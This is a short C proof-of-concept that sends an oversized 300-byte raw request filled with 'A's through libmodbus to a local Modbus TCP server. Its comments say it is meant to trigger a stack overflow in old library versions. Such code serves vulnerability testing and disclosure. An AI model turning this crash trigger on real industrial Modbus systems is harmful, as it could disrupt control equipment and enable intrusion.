#include <modbus/modbus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main() {
    modbus_t *ctx;
    int rc;

    // Allocate a maliciously large raw request buffer
    uint8_t raw_req[300];
    memset(raw_req, 0x41, sizeof(raw_req));  // Fill with 'A's

    // Set required header values
    raw_req[0] = 0x01;  // Unit ID
    raw_req[1] = 0x03;  // Function code (e.g., read holding registers)

    // Create a fake TCP Modbus context (localhost:1502)
    ctx = modbus_new_tcp("127.0.0.1", 1502);
    if (!ctx) {
        perror("modbus_new_tcp");
        return 1;
    }

    modbus_set_debug(ctx, TRUE);

    // The following call should trigger the stack overflow in old versions
    rc = modbus_send_raw_request(ctx, raw_req, sizeof(raw_req));
    if (rc == -1) {
        perror("modbus_send_raw_request failed");
    } else {
        printf("Sent %d bytes\n", rc);
    }

    modbus_free(ctx);
    return 0;
}
